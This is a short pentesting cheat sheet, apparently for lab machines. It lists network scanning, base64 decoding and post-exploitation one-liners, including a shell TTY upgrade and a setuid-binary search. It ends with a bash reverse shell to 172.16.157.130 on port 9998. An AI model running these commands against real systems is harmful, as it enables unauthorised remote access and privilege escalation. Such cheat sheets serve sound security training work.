Collection of Useful commands for Penetration Testing:



Basic Stuff:

*Restart networking: (useful for switching from host-only to bridged/NAT without reboot)
/etc/init.d/networking restart

*scan for hosts/targets on network
nmap -sn [network prefix] 
(i.e. if IP address is 192.168.56.25, network prefix on virtual machine would usually be 192.168.56.0/24)

*quick base64 decode (nice to make into little script)
echo [base64 string] | base64 -d



Once you get a shell:

* Get proper TTY shell:
python -c 'import pty; pty.spawn("/bin/sh")'

*Check which executables have setuid enabled
find / -perm -u=s -type f 2>/dev/null

*Bash Reverse shell:
bash -i >& /dev/tcp/172.16.157.130/9998 0>&1
